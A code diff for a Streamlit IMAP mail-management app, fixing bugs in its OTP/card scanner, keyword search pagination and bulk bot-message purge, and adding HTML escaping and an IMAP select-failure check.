@@ -2980,7 +3359,8 @@ with st.expander("🔑 Standalone OTP, Debit/Credit Cards & Sensitive Data Scann
                         st.markdown(f"- [{link}]({link})", unsafe_allow_html=True)
 
                 st.markdown("---")
-                display_body = msg["body"] if otp_auto_clean_toggle else msg["body"]
+                # v13.40: both branches were msg["body"], so the toggle did nothing.
+                display_body = msg["body"] if otp_auto_clean_toggle else msg.get("body_raw", msg["body"])
                 st.text_area("Message Payload Body", value=display_body, height=150, key=f"otp_b_{msg['folder']}_{msg['id']}_{idx}")
 
                 o_col1, o_col2, o_col3, o_col4 = st.columns(4)
@@ -2997,7 +3377,7 @@ with st.expander("🔑 Standalone OTP, Debit/Credit Cards & Sensitive Data Scann
                                 m_client.store(msg["id"], '+FLAGS', '\\Seen')
                                 msg["is_read"] = True
                                 save_session_cache()
-                                st.success("Marked as read!")
+                                flash("Marked as read.")
                                 st.rerun()
                             except Exception as ex:
                                 st.error(str(ex))
@@ -3010,7 +3390,7 @@ with st.expander("🔑 Standalone OTP, Debit/Credit Cards & Sensitive Data Scann
                             move_message(m_client, msg["folder"], msg["id"], otp_mv_target)
                             st.session_state.otp_messages.remove(msg)
                             save_session_cache()
-                            st.success(f"Moved to {otp_mv_target}!")
+                            flash(f"Moved to {otp_mv_target}.")
                             st.rerun()
                         except Exception as ex:
                             st.error(str(ex))
@@ -3024,7 +3404,7 @@ with st.expander("🔑 Standalone OTP, Debit/Credit Cards & Sensitive Data Scann
                             m_client.expunge()
                             st.session_state.otp_messages.remove(msg)
                             save_session_cache()
-                            st.success("Deleted message!")
+                            flash("Message deleted.")
                             st.rerun()
                         except Exception as ex:
                             st.error(str(ex))
@@ -3127,26 +3507,24 @@ with st.expander("🔍 Deep Keyword Search & Scope Filters", expanded=False):
                     st.session_state.search_current_page = 1
                     save_session_cache()
                     log(f"Search found {st.session_state.search_total_matched_count} total matches across target scope.")
+                    flash(f"Search complete. Found {st.session_state.search_total_matched_count} match(es).")
+                    st.rerun()
             except Exception as e:
                 st.error(str(e))
 
     st.markdown("#### ✉️ Search Results Message Stream")
     search_msgs = [m for m in st.session_state.search_messages if not should_blacklist_message(m, search_blacklist_input)]
-    search_total_msgs = len(search_msgs)
+    search_total_msgs = st.session_state.get("search_total_matched_count", len(search_msgs))
 
     if len(search_msgs) > 0:
-        search_total_pages = max(1, math.ceil(search_total_msgs / search_page_size))
-        search_curr_p = st.session_state.search_current_page
+        search_total_pages = max(1, math.ceil(search_total_msgs / max(1, search_page_size)))
+        search_curr_p = max(1, min(int(st.session_state.search_current_page or 1), search_total_pages))
+        st.session_state.search_current_page = search_curr_p
 
         st.markdown(f"**Showing Page {search_curr_p} of {search_total_pages} (Total Matches Found: {search_total_msgs})**")
 
         for idx, msg in enumerate(search_msgs):
-            status_icon = "📖" if msg["is_read"] else "📩"
-            cat_list = msg.get("categories", [])
-            cat_badge = f" [{' '.join(cat_list)}]" if cat_list else ""
-            folder_badge = f" [{msg['folder']}]"
-
-            with st.expander(f"{status_icon}{folder_badge} [{msg['date']}] {msg['from']} - {msg['subject']}{cat_badge}", expanded=False):
+            with st.expander(msg_label(msg, idx), expanded=False):
                 st.write(f"**Folder:** {msg['folder']}")
                 st.write(f"**From:** {msg['from']}")
                 st.write(f"**To:** {msg['to']}")
@@ -3180,7 +3558,7 @@ with st.expander("🔍 Deep Keyword Search & Scope Filters", expanded=False):
                                 m_client.store(msg["id"], '+FLAGS', '\\Seen')
                                 msg["is_read"] = True
                                 save_session_cache()
-                                st.success("Marked as read!")
+                                flash("Marked as read.")
                                 st.rerun()
                             except Exception as ex:
                                 st.error(str(ex))
@@ -3193,7 +3571,7 @@ with st.expander("🔍 Deep Keyword Search & Scope Filters", expanded=False):
                             move_message(m_client, msg["folder"], msg["id"], s_target_move)
                             st.session_state.search_messages.remove(msg)
                             save_session_cache()
-                            st.success(f"Moved to {s_target_move}!")
+                            flash(f"Moved to {s_target_move}.")
                             st.rerun()
                         except Exception as ex:
                             st.error(str(ex))
@@ -3208,7 +3586,7 @@ with st.expander("🔍 Deep Keyword Search & Scope Filters", expanded=False):
                             m_client.expunge()
                             st.session_state.search_messages.remove(msg)
                             save_session_cache()
-                            st.success("Deleted message!")
+                            flash("Message deleted.")
                             st.rerun()
                         except Exception as ex:
                             st.error(str(ex))
@@ -3305,7 +3683,8 @@ with st.expander("🤖 Mass Bot Purge & Intelligence Hub", expanded=False):
                         st.session_state.bot_filter_mode = True
                         st.session_state.bot_current_page = 1
                         save_session_cache()
-                        st.success("Scan complete. Displaying detected bot/Telegram messages.")
+                        flash("Scan complete. Stream filtered to detected bot/Telegram messages.")
+                        st.rerun()
                 except Exception as ex:
                     st.error(str(ex))
 
@@ -3323,24 +3702,37 @@ with st.expander("🤖 Mass Bot Purge & Intelligence Hub", expanded=False):
 
                     folders = sorted({bm["folder"] for bm in all_loaded_bot_msgs}) or [folder]
                     terms = ["telegram", "otp", "verification", "passcode", "bot"]
+                    skipped_folders = []
                     for r_folder in folders:
                         r_encoded = encode_imap_utf7(get_imap_path(r_folder))
-                        mail.select(f'"{r_encoded}"', readonly=False)
+                        sel_typ, sel_data = mail.select(f'"{r_encoded}"', readonly=False)
+                        if sel_typ != "OK":
+                            # v13.40: the return was ignored, so a folder that
+                            # failed to open got purged from the WRONG mailbox.
+                            bot_log(f"⚠️ Skipped '{r_folder}': select failed ({sel_typ} {sel_data})")
+                            skipped_folders.append(r_folder)
+                            continue
+                        bot_log(f"📂 Selected '{r_folder}' for purge.")
                         found = set()
                         for term in terms:
                             typ, data = mail.search(None, "TEXT", term)
                             if typ == "OK" and data and data[0]:
                                 found.update((data[0] or b"").split())
-                        for mid in found:
-                            mail.store(mid, "+FLAGS", "\\Deleted")
-                            deleted_count += 1
+                        bot_log(f"  └─ {len(found)} candidate IDs in '{r_folder}'.")
+                        if found:
+                            # v13.40: one comma-joined store instead of N round-trips.
+                            id_csv = b",".join(sorted(found, key=lambda x: int(x)))
+                            mail.store(id_csv, "+FLAGS", "\\Deleted")
+                        deleted_count += len(found)
                         mail.expunge()
+                    if skipped_folders:
+                        bot_log(f"🏁 Skipped folders: {skipped_folders}")
 
-                    bot_log(f"🏁 [MASS DELETE COMPLETE] Successfully purged {deleted_count} bot messages from server.")
-                    st.success(f"Successfully deleted {deleted_count} bot messages!")
+                    bot_log(f"🏁 [MASS DELETE COMPLETE] Purged {deleted_count} messages across {len(folders) - len(skipped_folders)} folder(s).")
                     st.session_state.current_messages = [m for m in st.session_state.current_messages if not m["is_bot"]]
                     st.session_state.bot_filter_mode = False
                     save_session_cache()
+                    flash(f"Purged {deleted_count} message(s)." + (f" Skipped: {', '.join(skipped_folders)}" if skipped_folders else ""))
                     st.rerun()
                 except Exception as e:
                     bot_log(f"❌ [MASS DELETE EXCEPTION]: {e}")
@@ -3359,7 +3751,11 @@ with st.expander("🤖 Mass Bot Purge & Intelligence Hub", expanded=False):
         st.markdown(f"**Showing Bot Page {bot_curr_p} of {bot_total_pages} ({len(all_loaded_bot_msgs)} Total Detected Bots)**")
 
         for idx, bm in enumerate(paged_bot_msgs, start_idx + 1):
-            st.markdown(f"**[{idx}] [{bm['folder']}]** `{bm['from']}` — **{bm['subject']}** (ID: `{bm['id']}`) ")
+            _subj = re.sub(r"\s+", " ", str(bm.get("subject", "")))[:120]
+            st.markdown(
+                f"**[{idx}] [{html.escape(str(bm['folder']))}]** `{html.escape(str(bm['from']))}` — "
+                f"**{html.escape(_subj)}** (ID: `{bm['id']}`)"
+            )
             if bm["pins"]:
                 st.info(f"🔑 PINs detected: {', '.join(bm['pins'])}")
 
